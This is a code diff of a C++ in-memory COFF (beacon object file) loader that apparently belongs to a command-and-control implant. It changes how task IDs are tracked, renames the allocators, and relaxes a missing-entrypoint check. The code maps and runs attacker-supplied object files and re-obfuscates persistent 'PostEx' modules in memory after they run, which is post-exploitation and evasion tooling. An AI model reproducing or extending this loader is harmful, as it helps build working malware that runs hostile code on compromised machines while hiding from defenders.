@@ -3,46 +3,25 @@
 auto Coff::GetCmdID(
     PVOID Address
 ) -> ULONG {
-    BOF_OBJ* Obj = Node;
-
-    while ( Obj ) {
-        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
-            return Obj->CmdID; 
-        }
-        Obj = Obj->Next;
-    }
-
-    return 0; 
+    return Self->Jbs->CurrentSubId;
 }
 
 auto Coff::GetTask(
     PVOID Address
 ) -> CHAR* {
-    BOF_OBJ* Obj = Node;
-
-    while ( Obj ) {
-        if ( Address >= Obj->MmBegin && Address < Obj->MmEnd ) {
-            return Obj->UUID; 
-        }
-        Obj = Obj->Next;
-    }
-
-    return nullptr; 
+    return Self->Jbs->CurrentUUID;
 }
 
 auto Coff::Add(
     PVOID MmBegin,
     PVOID MmEnd,
-    CHAR* UUID,
-    ULONG CmdID,
     PVOID Entry
 ) -> BOF_OBJ* {
-    BOF_OBJ* NewObj = (BOF_OBJ*)hAlloc( sizeof( BOF_OBJ ) );
+    BOF_OBJ* NewObj = (BOF_OBJ*)KhAlloc( sizeof( BOF_OBJ ) );
 
     if (
         ! MmBegin ||
-        ! MmEnd   ||
-        ! UUID
+        ! MmEnd  
     ) {
         return nullptr;
     }
@@ -50,8 +29,6 @@ auto Coff::Add(
     NewObj->Entry   = Entry;
     NewObj->MmBegin = MmBegin;
     NewObj->MmEnd   = MmEnd;
-    NewObj->UUID    = UUID;
-    NewObj->CmdID   = CmdID;
 
     if ( !this->Node ) {
         this->Node = NewObj;
@@ -77,7 +54,7 @@ auto Coff::Rm(
 
     if ( this->Node == Obj ) {
         BOF_OBJ* NextNode = this->Node->Next;
-        hFree( this->Node );
+        KhFree( this->Node );
         this->Node = NextNode;
         return TRUE;
     }
@@ -89,7 +66,7 @@ auto Coff::Rm(
 
     if ( Previous->Next == Obj ) {
         BOF_OBJ* NextNode = Obj->Next;
-        hFree(Obj);      
+        KhFree(Obj);      
         Previous->Next = NextNode;
         return TRUE;
     }
@@ -291,13 +268,13 @@ auto Coff::Map(
 
     COFF_DATA CoffData = { 0 };
 
-    CoffData.Sec = (SECTION_DATA*)hAlloc( SecNbrs * sizeof(SECTION_DATA) );
-    CoffData.Sym = (SYMBOL_DATA*)hAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
+    CoffData.Sec = (SECTION_DATA*)KhAlloc( SecNbrs * sizeof(SECTION_DATA) );
+    CoffData.Sym = (SYMBOL_DATA*)KhAlloc( SymNbrs * sizeof(SYMBOL_DATA) );
     
     if ( !CoffData.Sec || !CoffData.Sym ) {
         KhDbg("failed to allocate memory for sections/symbols");
-        if ( CoffData.Sec ) hFree( CoffData.Sec );
-        if ( CoffData.Sym ) hFree( CoffData.Sym );
+        if ( CoffData.Sec ) KhFree( CoffData.Sec );
+        if ( CoffData.Sym ) KhFree( CoffData.Sym );
         return FALSE;
     }
 
@@ -356,8 +333,8 @@ auto Coff::Map(
     MmBase = Self->Mm->Alloc( nullptr, MmSize, MEM_COMMIT, PAGE_READWRITE );
     if ( !MmBase ) {
         KhDbg("failed to allocate memory for COFF");
-        hFree( CoffData.Sec );
-        hFree( CoffData.Sym );
+        KhFree( CoffData.Sec );
+        KhFree( CoffData.Sym );
         return FALSE;
     }
 
@@ -415,8 +392,8 @@ auto Coff::Map(
     }
 
     if ( ExecCount > 0 ) {
-        Mapped->ExecSections = (PVOID*)hAlloc( ExecCount * sizeof(PVOID) );
-        Mapped->ExecSizes    = (ULONG*)hAlloc( ExecCount * sizeof(ULONG) );
+        Mapped->ExecSections = (PVOID*)KhAlloc( ExecCount * sizeof(PVOID) );
+        Mapped->ExecSizes    = (ULONG*)KhAlloc( ExecCount * sizeof(ULONG) );
         
         if ( Mapped->ExecSections && Mapped->ExecSizes ) {
             ULONG idx = 0;
@@ -463,13 +440,7 @@ auto Coff::Map(
     }
 
     if ( !EntryPoint ) {
-        KhDbg("failed to find 'go' entrypoint");
-        Self->Mm->Free( MmBase, MmSize, MEM_RELEASE );
-        hFree( CoffData.Sec );
-        hFree( CoffData.Sym );
-        if ( Mapped->ExecSections ) hFree( Mapped->ExecSections );
-        if ( Mapped->ExecSizes )    hFree( Mapped->ExecSizes );
-        return FALSE;
+        KhDbg("'go' entrypoint not found - COFF may use custom entry points");
     }
 
     Mapped->MmBase       = MmBase;
@@ -564,9 +535,7 @@ auto Coff::Deobfuscate(
 auto Coff::Execute(
     _In_ COFF_MAPPED* Mapped,
     _In_ BYTE*        Args,
-    _In_ ULONG        Argc,
-    _In_ CHAR*        UUID,
-    _In_ ULONG        CmdID
+    _In_ ULONG        Argc
 ) -> BOOL {
     if ( !Mapped || !Mapped->MmBase || !Mapped->EntryPoint ) {
         KhDbg("invalid mapped COFF");
@@ -587,8 +556,7 @@ auto Coff::Execute(
     KhDbg("executing mapped COFF at 0x%p", Mapped->EntryPoint);
 
     BOF_OBJ* Obj = (BOF_OBJ*)this->Add( 
-        Mapped->MmBase, PTR( U_PTR( Mapped->MmBase ) + Mapped->MmSize ), 
-        UUID, CmdID, Mapped->EntryPoint 
+        Mapped->MmBase, PTR( U_PTR( Mapped->MmBase ) + Mapped->MmSize ), Mapped->EntryPoint 
     );
 
     if ( Obj ) KhDbg("added the object to the list");
@@ -600,7 +568,7 @@ auto Coff::Execute(
     //
     // for persistent COFFs (PostEx), re-obfuscate after execution
     //
-    if ( (Action::Task)CmdID == Action::Task::PostEx ) {
+    if ( (Action::Task)Self->Jbs->CurrentCmdId == Action::Task::PostEx ) {
         this->Obfuscate( Mapped );
     } else {
         if ( this->Rm( Obj ) ) KhDbg("removed the object from the list");
@@ -630,10 +598,10 @@ auto Coff::Unmap(
         Self->Mm->Free( Mapped->MmBase, Mapped->MmSize, MEM_RELEASE );
     }
 
-    if ( Mapped->CoffData.Sec )  hFree( Mapped->CoffData.Sec );
-    if ( Mapped->CoffData.Sym )  hFree( Mapped->CoffData.Sym );
-    if ( Mapped->ExecSections )  hFree( Mapped->ExecSections );
-    if ( Mapped->ExecSizes )     hFree( Mapped->ExecSizes );
+    if ( Mapped->CoffData.Sec )  KhFree( Mapped->CoffData.Sec );
+    if ( Mapped->CoffData.Sym )  KhFree( Mapped->CoffData.Sym );
+    if ( Mapped->ExecSections )  KhFree( Mapped->ExecSections );
+    if ( Mapped->ExecSizes )     KhFree( Mapped->ExecSizes );
 
     Mem::Zero( (UPTR)Mapped, sizeof(COFF_MAPPED) );
 
@@ -679,9 +647,7 @@ auto Coff::Loader(
     _In_ BYTE* Buffer,
     _In_ ULONG Size,
     _In_ BYTE* Args,
-    _In_ ULONG Argc,
-    _In_ CHAR* UUID,
-    _In_ ULONG CmdID
+    _In_ ULONG Argc
 ) -> BOOL {
     COFF_MAPPED Mapped = { 0 };
 
@@ -689,12 +655,12 @@ auto Coff::Loader(
         return FALSE;
     }
 
-    BOOL Result = this->Execute( &Mapped, Args, Argc, UUID, CmdID );
+    BOOL Result = this->Execute( &Mapped, Args, Argc );
 
     //
     // only unmap if not persistent (PostEx stays mapped + obfuscated)
     //
-    if ( (Action::Task)CmdID != Action::Task::PostEx ) {
+    if ( (Action::Task)Self->Jbs->CurrentCmdId != Action::Task::PostEx ) {
         this->Unmap( &Mapped );
     }
 
